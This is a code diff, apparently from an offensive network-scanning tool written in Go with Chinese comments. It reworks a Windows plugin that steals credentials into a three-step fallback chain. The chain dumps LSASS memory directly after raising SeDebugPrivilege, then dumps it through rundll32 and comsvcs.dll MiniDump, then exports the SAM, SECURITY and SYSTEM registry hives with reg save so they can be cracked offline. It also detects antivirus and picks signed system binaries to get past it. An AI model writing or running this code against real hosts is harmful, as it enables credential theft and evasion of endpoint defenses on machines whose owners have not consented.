@@ -7,8 +7,8 @@ import (
 	"errors"
 	"fmt"
 	"os"
+	"os/exec"
 	"path/filepath"
-	"runtime"
 	"strings"
 	"syscall"
 	"time"
@@ -82,7 +82,7 @@ func NewMiniDumpPlugin() *MiniDumpPlugin {
 	}
 }
 
-// Scan 执行内存转储 - 直接实现
+// Scan 执行凭据提取——降级链：直接dump → comsvcs.dll → reg save
 func (p *MiniDumpPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
 	_ = session.Config
 	_ = session.State
@@ -94,119 +94,124 @@ func (p *MiniDumpPlugin) Scan(ctx context.Context, info *common.HostInfo, sessio
 
 	var output strings.Builder
 
-	output.WriteString("=== 进程内存转储 ===\n")
-	output.WriteString(fmt.Sprintf("平台: %s\n", runtime.GOOS))
-
-	// 加载系统DLL
-	if err := p.loadSystemDLLs(); err != nil {
-		output.WriteString(fmt.Sprintf("加载系统DLL失败: %v\n", err))
-		return &plugins.Result{
-			Success: false,
-			Output:  output.String(),
-			Error:   err,
-		}
-	}
-
 	// 检查管理员权限
 	if !p.isAdmin() {
-		output.WriteString("需要管理员权限才能执行内存转储\n")
-		return &plugins.Result{
-			Success: false,
-			Output:  output.String(),
-			Error:   errors.New("需要管理员权限"),
+		return &plugins.Result{Success: false, Output: "需要管理员权限\n", Error: errors.New("需要管理员权限")}
+	}
+
+	if err := p.loadSystemDLLs(); err != nil {
+		return &plugins.Result{Success: false, Output: fmt.Sprintf("加载系统DLL失败: %v\n", err), Error: err}
+	}
+
+	pm := &ProcessManager{kernel32: p.kernel32, dbghelp: p.dbghelp, advapi32: p.advapi32}
+	avActive := p.isAVBlocking()
+
+	// 方式1：直接 MiniDumpWriteDump（无杀软时尝试）
+	if !avActive {
+		output.WriteString("[*] 尝试直接内存转储...\n")
+		if ok := p.tryDirectDump(ctx, pm, &output); ok {
+			return &plugins.Result{Success: true, Type: plugins.ResultTypeService, Output: output.String()}
 		}
+	} else {
+		output.WriteString("[*] 检测到杀软防护，跳过直接dump\n")
 	}
 
-	output.WriteString("✓ 已确认具有管理员权限\n")
-
-	// 创建进程管理器
-	pm := &ProcessManager{
-		kernel32: p.kernel32,
-		dbghelp:  p.dbghelp,
-		advapi32: p.advapi32,
+	// 方式2：comsvcs.dll（系统签名DLL，部分杀软不拦截）
+	output.WriteString("[*] 尝试 comsvcs.dll 方式...\n")
+	if ok := p.tryComsvcsDump(pm, &output); ok {
+		return &plugins.Result{Success: true, Type: plugins.ResultTypeService, Output: output.String()}
 	}
 
-	// 查找lsass.exe进程
-	output.WriteString("正在查找lsass.exe进程...\n")
+	// 方式3：reg save 导出注册表 hive（离线破解，不碰 LSASS）
+	output.WriteString("[*] 尝试 reg save 导出注册表...\n")
+	if ok := p.tryRegSave(&output); ok {
+		return &plugins.Result{Success: true, Type: plugins.ResultTypeService, Output: output.String()}
+	}
+
+	output.WriteString("[!] 所有方式均失败\n")
+	return &plugins.Result{Success: false, Output: output.String(), Error: errors.New("所有凭据提取方式均失败")}
+}
+
+func (p *MiniDumpPlugin) tryDirectDump(ctx context.Context, pm *ProcessManager, output *strings.Builder) bool {
 	pid, err := pm.findProcess("lsass.exe")
 	if err != nil {
-		output.WriteString(fmt.Sprintf("查找lsass.exe失败: %v\n", err))
-		return &plugins.Result{
-			Success: false,
-			Output:  output.String(),
-			Error:   err,
-		}
+		output.WriteString(fmt.Sprintf("  查找lsass.exe失败: %v\n", err))
+		return false
 	}
 
-	output.WriteString(fmt.Sprintf("✓ 找到lsass.exe进程, PID: %d\n", pid))
-
-	// 提升权限
-	output.WriteString("正在提升SeDebugPrivilege权限...\n")
 	if privErr := pm.elevatePrivileges(); privErr != nil {
-		output.WriteString(fmt.Sprintf("权限提升失败: %v\n", privErr))
-		return &plugins.Result{
-			Success: false,
-			Output:  output.String(),
-			Error:   fmt.Errorf("SeDebugPrivilege 提升失败: %w", privErr),
-		}
-	}
-	output.WriteString("✓ 权限提升成功\n")
-
-	// 检测杀软——Defender 等会拦截 LSASS dump 导致 API hang
-	if p.isAVBlocking() {
-		output.WriteString("检测到活跃的杀软防护，LSASS dump 大概率被拦截，跳过\n")
-		return &plugins.Result{
-			Success: false,
-			Output:  output.String(),
-			Error:   errors.New("杀软防护活跃，跳过 LSASS dump"),
-		}
+		output.WriteString(fmt.Sprintf("  权限提升失败: %v\n", privErr))
+		return false
 	}
 
-	// 创建转储文件
 	outputPath := filepath.Join(".", fmt.Sprintf("lsass-%d.dmp", pid))
-	output.WriteString(fmt.Sprintf("准备创建转储文件: %s\n", outputPath))
-
-	// 执行转储
-	output.WriteString("开始执行内存转储...\n")
-
-	// 创建带超时的context（正常 dump 几秒完成，超过 15 秒说明被拦截）
 	dumpCtx, cancel := context.WithTimeout(ctx, 15*time.Second)
 	defer cancel()
 
-	err = pm.dumpProcessWithTimeout(dumpCtx, pid, outputPath)
-	if err != nil {
-		output.WriteString(fmt.Sprintf("内存转储失败: %v\n", err))
-		// 创建错误信息文件
-		errorData := []byte(fmt.Sprintf("Memory dump failed for PID %d\nError: %v\nTimestamp: %s\n",
-			pid, err, time.Now().Format("2006-01-02 15:04:05")))
-		_ = os.WriteFile(outputPath, errorData, 0644)
+	if err := pm.dumpProcessWithTimeout(dumpCtx, pid, outputPath); err != nil {
+		output.WriteString(fmt.Sprintf("  直接dump失败: %v\n", err))
+		os.Remove(outputPath)
+		return false
+	}
 
-		return &plugins.Result{
-			Success: false,
-			Output:  output.String(),
-			Error:   err,
+	return p.reportSuccess(output, outputPath, "直接内存转储")
+}
+
+func (p *MiniDumpPlugin) tryComsvcsDump(pm *ProcessManager, output *strings.Builder) bool {
+	pid, err := pm.findProcess("lsass.exe")
+	if err != nil {
+		output.WriteString(fmt.Sprintf("  查找lsass.exe失败: %v\n", err))
+		return false
+	}
+
+	_ = pm.elevatePrivileges()
+
+	outputPath := filepath.Join(".", fmt.Sprintf("lsass-%d.dmp", pid))
+	cmd := exec.Command("rundll32.exe", "C:\\Windows\\System32\\comsvcs.dll,", "MiniDump",
+		fmt.Sprintf("%d", pid), outputPath, "full")
+	if err := cmd.Run(); err != nil {
+		output.WriteString(fmt.Sprintf("  comsvcs.dll失败: %v\n", err))
+		return false
+	}
+
+	return p.reportSuccess(output, outputPath, "comsvcs.dll")
+}
+
+func (p *MiniDumpPlugin) tryRegSave(output *strings.Builder) bool {
+	files := map[string]string{
+		"SAM":      filepath.Join(".", "sam.hiv"),
+		"SECURITY": filepath.Join(".", "security.hiv"),
+		"SYSTEM":   filepath.Join(".", "system.hiv"),
+	}
+
+	saved := 0
+	for hive, path := range files {
+		if err := exec.Command("reg", "save", fmt.Sprintf("HKLM\\%s", hive), path, "/y").Run(); err == nil {
+			if fi, err := os.Stat(path); err == nil {
+				output.WriteString(fmt.Sprintf("  ✓ %s → %s (%d bytes)\n", hive, path, fi.Size()))
+				saved++
+			}
+		} else {
+			output.WriteString(fmt.Sprintf("  ✗ %s 导出失败\n", hive))
 		}
 	}
 
-	// 获取文件信息
-	fileInfo, err := os.Stat(outputPath)
-	var fileSize int64
-	if err == nil {
-		fileSize = fileInfo.Size()
+	if saved == 3 {
+		output.WriteString("[+] 注册表 hive 导出完成，可用 secretsdump 离线解析\n")
+		common.LogSuccess(i18n.Tr("minidump_regsave_success"))
+		return true
 	}
+	return false
+}
 
-	output.WriteString("✓ 内存转储完成\n")
-	output.WriteString(fmt.Sprintf("转储文件: %s\n", outputPath))
-	output.WriteString(fmt.Sprintf("文件大小: %d bytes\n", fileSize))
-
-	common.LogSuccess(i18n.Tr("minidump_success", outputPath, fileSize))
-
-	return &plugins.Result{
-		Success: true,
-		Type:    plugins.ResultTypeService,
-		Output:  output.String(),
-		Error:   nil,
+func (p *MiniDumpPlugin) reportSuccess(output *strings.Builder, path, method string) bool {
+	fi, err := os.Stat(path)
+	if err != nil || fi.Size() == 0 {
+		return false
 	}
+	output.WriteString(fmt.Sprintf("[+] %s成功: %s (%d bytes)\n", method, path, fi.Size()))
+	common.LogSuccess(i18n.Tr("minidump_success", path, fi.Size()))
+	return true
 }
 
 // loadSystemDLLs 加载系统DLL
